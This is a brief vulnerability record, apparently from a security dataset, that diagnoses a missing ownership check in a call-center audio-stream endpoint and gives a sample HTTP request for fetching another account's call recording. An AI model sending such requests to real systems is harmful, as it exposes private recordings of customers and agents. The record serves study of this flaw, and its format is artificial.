diagnosis: The audio streaming endpoint instantiates an AudioDuplexPipeline using req.params.recordingId directly from the URL. It does not check if the customer support call recording belongs to the requesting client's account, allowing any user to listen to sensitive call recordings of other customers and agents.
exploit_request:
GET /api/calls/call_rec_202509_98124/audio-stream HTTP/1.1
Host: telephony.callcenter.internal:3002
Cookie: session_user_id=usr_661928
Accept: audio/wav
